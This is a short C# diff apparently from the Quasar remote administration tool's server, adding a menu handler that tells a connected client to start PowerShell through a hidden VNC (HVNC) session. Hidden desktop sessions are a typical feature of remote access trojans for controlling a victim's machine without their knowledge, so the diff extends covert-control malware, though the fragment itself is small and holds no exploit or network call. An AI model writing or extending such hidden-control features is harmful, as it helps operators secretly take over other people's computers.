@@ -436,6 +436,14 @@ namespace Quasar.Server.Forms
             });
         }
 
+        private void startPowershellToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            _connectClient.Send(new StartHVNCProcess
+            {
+                Application = "Powershell"
+            });
+        }
+
         #endregion
 
         private void btnHide_Click(object sender, EventArgs e)
